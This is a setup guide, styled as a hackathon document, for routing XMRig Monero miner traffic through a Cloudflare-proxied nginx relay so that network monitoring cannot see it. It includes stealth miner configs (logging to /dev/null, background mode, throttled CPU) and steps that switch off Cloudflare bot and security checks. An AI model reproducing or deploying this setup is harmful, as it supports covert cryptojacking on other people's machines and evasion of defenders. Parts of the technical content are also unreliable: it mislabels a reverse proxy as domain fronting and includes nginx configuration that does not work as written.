# Domain Fronting Setup Guide for XMRig

**OSCP Hackathon 2025 - Network Evasion Infrastructure**

**Purpose**: Step-by-step guide to configure domain fronting for XMRig C2 communication

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Cloudflare Setup](#cloudflare-setup)
3. [Nginx Reverse Proxy](#nginx-reverse-proxy)
4. [XMRig Configuration](#xmrig-configuration)
5. [Testing & Validation](#testing--validation)
6. [Troubleshooting](#troubleshooting)

---

## Prerequisites

### Infrastructure Required

- **Domain Name**: `your-domain.com` (registered and accessible)
- **VPS/Server**: Linux server with public IP
- **Cloudflare Account**: Free tier sufficient
- **SSL Certificate**: Let's Encrypt (free) or Cloudflare Origin

### Software Requirements

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install nginx certbot python3-certbot-nginx

# CentOS/RHEL
sudo yum install nginx certbot python3-certbot-nginx
```

---

## Cloudflare Setup

### Step 1: Add Domain to Cloudflare

1. **Login to Cloudflare**: https://dash.cloudflare.com
2. **Add Site**: Click "Add a Site"
3. **Enter Domain**: `your-domain.com`
4. **Select Plan**: Free plan is sufficient
5. **Update Nameservers**: Point your domain's nameservers to Cloudflare's NS

### Step 2: Configure DNS Records

Add A record for your fronted subdomain:

```
Type: A
Name: xmrig (creates xmrig.your-domain.com)
IPv4: YOUR_VPS_IP
Proxy status: Proxied (orange cloud) ← CRITICAL!
TTL: Auto
```

**Important**: Orange cloud MUST be enabled for domain fronting!

### Step 3: SSL/TLS Settings

Navigate to: **SSL/TLS** → **Overview**

**Encryption Mode**: `Full (strict)`

This ensures:
- Client → Cloudflare: Encrypted (Cloudflare cert)
- Cloudflare → Your Server: Encrypted (your cert)

### Step 4: Enable HTTP/2 & HTTP/3

Navigate to: **Network**

Enable:
- [x] HTTP/2
- [x] HTTP/3 (with QUIC)
- [x] 0-RTT Connection Resumption

This improves performance and makes traffic look more legitimate.

### Step 5: Security Settings

Navigate to: **Security** → **Settings**

**Security Level**: `Low` or `Essentially Off`
- Prevents legitimate XMRig traffic from being challenged

**Bot Fight Mode**: `OFF`
- Prevents XMRig from being flagged as bot

---

## Nginx Reverse Proxy

### Step 1: Install SSL Certificate

```bash
# Generate Let's Encrypt certificate
sudo certbot --nginx -d xmrig.your-domain.com

# Certificate will be at:
# /etc/letsencrypt/live/xmrig.your-domain.com/fullchain.pem
# /etc/letsencrypt/live/xmrig.your-domain.com/privkey.pem
```

### Step 2: Nginx Configuration

Create: `/etc/nginx/sites-available/xmrig-proxy`

```nginx
# XMRig Domain Fronting Proxy

# Upstream pool configuration
upstream mining_pool {
    server pool.supportxmr.com:443;
    keepalive 32;
}

# HTTP → HTTPS redirect
server {
    listen 80;
    server_name xmrig.your-domain.com;

    return 301 https://$server_name$request_uri;
}

# HTTPS proxy
server {
    listen 443 ssl http2;
    server_name xmrig.your-domain.com;

    # SSL certificates
    ssl_certificate /etc/letsencrypt/live/xmrig.your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/xmrig.your-domain.com/privkey.pem;

    # SSL optimization
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;

    # Logging
    access_log /var/log/nginx/xmrig_access.log;
    error_log /var/log/nginx/xmrig_error.log;

    # Proxy to mining pool
    location / {
        # Proxy pass to upstream
        proxy_pass https://mining_pool;

        # Critical: Set Host header to real pool
        proxy_set_header Host pool.supportxmr.com;

        # Standard proxy headers
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket support (for Stratum)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;

        # Buffering
        proxy_buffering off;
        proxy_request_buffering off;
    }

    # Health check endpoint
    location /health {
        access_log off;
        return 200 "OK\n";
        add_header Content-Type text/plain;
    }
}
```

### Step 3: Enable Configuration

```bash
# Create symbolic link
sudo ln -s /etc/nginx/sites-available/xmrig-proxy /etc/nginx/sites-enabled/

# Test configuration
sudo nginx -t

# Reload nginx
sudo systemctl reload nginx

# Enable nginx on boot
sudo systemctl enable nginx
```

### Step 4: Firewall Configuration

```bash
# Allow HTTPS
sudo ufw allow 443/tcp

# Allow HTTP (for Let's Encrypt renewal)
sudo ufw allow 80/tcp

# Enable firewall
sudo ufw enable
```

---

## XMRig Configuration

### Basic Configuration

Create: `/opt/xmrig/.config.json`

```json
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "priority": 0,
        "max-threads-hint": 25
    },
    "donate-level": 0,
    "log-file": "/dev/null",
    "pools": [
        {
            "url": "xmrig.your-domain.com:443",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": true,
            "tls-fingerprint": null
        }
    ],
    "background": true,
    "syslog": false,
    "print-time": 300,
    "retries": 5,
    "retry-pause": 5
}
```

### Advanced Configuration with Fallback

```json
{
    "pools": [
        {
            "url": "xmrig.your-domain.com:443",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": true,
            "priority": 1
        },
        {
            "url": "pool.supportxmr.com:443",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": true,
            "priority": 2
        }
    ]
}
```

---

## Testing & Validation

### Test 1: Nginx Proxy Functionality

```bash
# From your server
curl -v https://xmrig.your-domain.com/health

# Expected output:
# HTTP/2 200
# OK
```

### Test 2: DNS Resolution

```bash
# Check DNS resolution
dig xmrig.your-domain.com

# Expected: Should resolve to Cloudflare IPs (not your server IP)
# Example: 104.16.x.x or 172.67.x.x
```

### Test 3: SSL Certificate

```bash
# Check certificate
echo | openssl s_client -connect xmrig.your-domain.com:443 -servername xmrig.your-domain.com 2>/dev/null | openssl x509 -noout -text

# Verify:
# - Issuer: Cloudflare or Let's Encrypt
# - Subject: xmrig.your-domain.com
# - Valid dates
```

### Test 4: XMRig Connection

```bash
# Test XMRig connection
/opt/xmrig/xmrig --url xmrig.your-domain.com:443 \\
                 --user YOUR_WALLET \\
                 --pass x \\
                 --tls \\
                 --print-time 10 \\
                 --donate-level 0

# Watch for:
# [pool] connected to xmrig.your-domain.com:443
# [pool] login succeeded
# [cpu] accepted (1/1)
```

### Test 5: Traffic Validation

```bash
# On your server, monitor traffic
sudo tcpdump -i any -n 'port 443' -A

# Verify:
# - Connections from Cloudflare IPs (not client IPs)
# - TLS encrypted traffic
# - Stratum protocol inside
```

---

## Troubleshooting

### Issue 1: XMRig Can't Connect

**Symptom**: `[pool] connect error`

**Solutions**:

```bash
# 1. Check nginx is running
sudo systemctl status nginx

# 2. Check nginx logs
sudo tail -f /var/log/nginx/xmrig_error.log

# 3. Verify DNS
nslookup xmrig.your-domain.com

# 4. Test direct connection
telnet xmrig.your-domain.com 443

# 5. Check firewall
sudo ufw status
```

### Issue 2: SSL Certificate Errors

**Symptom**: `certificate verify failed`

**Solutions**:

```bash
# Renew certificate
sudo certbot renew

# Check certificate validity
sudo certbot certificates

# Force renewal
sudo certbot renew --force-renewal
```

### Issue 3: Pool Connection Failures

**Symptom**: Nginx connects but pool rejects

**Solutions**:

```nginx
# Verify Host header in nginx config
proxy_set_header Host pool.supportxmr.com;  # Must match real pool

# Test pool directly
telnet pool.supportxmr.com 443

# Check nginx upstream logs
sudo tail -f /var/log/nginx/xmrig_error.log | grep upstream
```

### Issue 4: Cloudflare Blocking Traffic

**Symptom**: 403 Forbidden or CAPTCHA

**Solutions**:

1. **Disable Bot Fight Mode** (Cloudflare Dashboard → Security)
2. **Lower Security Level** to "Essentially Off"
3. **Create Firewall Rule**:
   ```
   (http.host eq "xmrig.your-domain.com")
   Action: Allow
   ```

### Issue 5: Poor Performance / High Latency

**Solutions**:

```nginx
# Optimize nginx configuration

# Increase worker connections
events {
    worker_connections 4096;
}

# Enable HTTP/2 push
http2_push_preload on;

# Optimize SSL
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;

# Enable compression
gzip on;
gzip_vary on;
gzip_proxied any;
```

---

## Advanced Configurations

### Multi-Pool Load Balancing

```nginx
upstream mining_pool {
    least_conn;  # Load balance algorithm

    server pool.supportxmr.com:443 weight=3;
    server pool.minexmr.com:443 weight=2;
    server xmr.nanopool.org:443 weight=1;

    keepalive 64;
}
```

### Rate Limiting (Optional)

```nginx
# Limit requests per IP
limit_req_zone $binary_remote_addr zone=mining_limit:10m rate=10r/s;

server {
    # ...

    location / {
        limit_req zone=mining_limit burst=20 nodelay;
        proxy_pass https://mining_pool;
        # ...
    }
}
```

### Geographic Routing

```nginx
# Route based on Cloudflare's CF-IPCountry header
map $http_cf_ipcountry $pool_server {
    default pool.supportxmr.com:443;
    US pool-us.supportxmr.com:443;
    EU pool-eu.supportxmr.com:443;
    AS pool-asia.supportxmr.com:443;
}

upstream mining_pool {
    server $pool_server;
}
```

---

## Monitoring & Logging

### Nginx Access Log Analysis

```bash
# Monitor connections
sudo tail -f /var/log/nginx/xmrig_access.log

# Count connections per IP
sudo awk '{print $1}' /var/log/nginx/xmrig_access.log | sort | uniq -c | sort -rn

# Monitor traffic volume
sudo tail -f /var/log/nginx/xmrig_access.log | awk '{sum+=$10} END {print sum/1024/1024 " MB"}'
```

### Server Monitoring Script

```bash
#!/bin/bash
# monitor_xmrig.sh - Monitor XMRig domain fronting proxy

echo "=== XMRig Proxy Status ==="
echo

# Nginx status
echo "[*] Nginx Status:"
systemctl is-active nginx && echo "  ✓ Running" || echo "  ✗ Stopped"

# Active connections
echo
echo "[*] Active Connections:"
netstat -an | grep :443 | grep ESTABLISHED | wc -l

# Recent errors
echo
echo "[*] Recent Errors (last 10):"
sudo tail -10 /var/log/nginx/xmrig_error.log

# Traffic stats
echo
echo "[*] Traffic (last hour):"
sudo journalctl -u nginx --since "1 hour ago" | grep xmrig | wc -l
echo "  requests"

# SSL certificate expiry
echo
echo "[*] SSL Certificate:"
echo | openssl s_client -connect localhost:443 -servername xmrig.your-domain.com 2>/dev/null | openssl x509 -noout -dates
```

---

## Security Hardening

### Additional Nginx Security

```nginx
# Add security headers
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer" always;

# Hide nginx version
server_tokens off;

# Disable unnecessary methods
if ($request_method !~ ^(GET|POST|HEAD)$) {
    return 405;
}
```

### Fail2Ban Configuration

```ini
# /etc/fail2ban/jail.d/xmrig.conf
[xmrig-proxy]
enabled = true
port = 443
logpath = /var/log/nginx/xmrig_error.log
maxretry = 5
bantime = 3600
```

---

## Complete Setup Checklist

### Infrastructure Setup
- [ ] VPS provisioned with public IP
- [ ] Domain registered and accessible
- [ ] Cloudflare account created

### Cloudflare Configuration
- [ ] Domain added to Cloudflare
- [ ] DNS A record created (proxied)
- [ ] SSL/TLS set to "Full (strict)"
- [ ] HTTP/2 and HTTP/3 enabled
- [ ] Security level lowered
- [ ] Bot Fight Mode disabled

### Server Configuration
- [ ] Nginx installed
- [ ] SSL certificate generated
- [ ] Nginx config created and enabled
- [ ] Firewall configured
- [ ] Nginx reloaded successfully

### Testing
- [ ] Health endpoint responds
- [ ] DNS resolves to Cloudflare
- [ ] SSL certificate valid
- [ ] XMRig connects successfully
- [ ] Mining shares submitted

### Monitoring
- [ ] Logs configured
- [ ] Monitoring script setup
- [ ] Alert system configured

---

## Conclusion

Domain fronting through Cloudflare provides robust protection for XMRig C2 communication:

**Benefits**:
- Hides true destination (pool) from network monitoring
- Uses legitimate CDN infrastructure
- SSL/TLS encrypted end-to-end
- High availability and performance
- Difficult to block without blocking entire CDN

**For Red Team**: Demonstrates advanced C2 infrastructure
**For Blue Team**: Understanding this technique improves detection capabilities

---

**Document Version**: 1.0
**Last Updated**: 2025-10-02
**Classification**: Educational - Authorized Testing Only
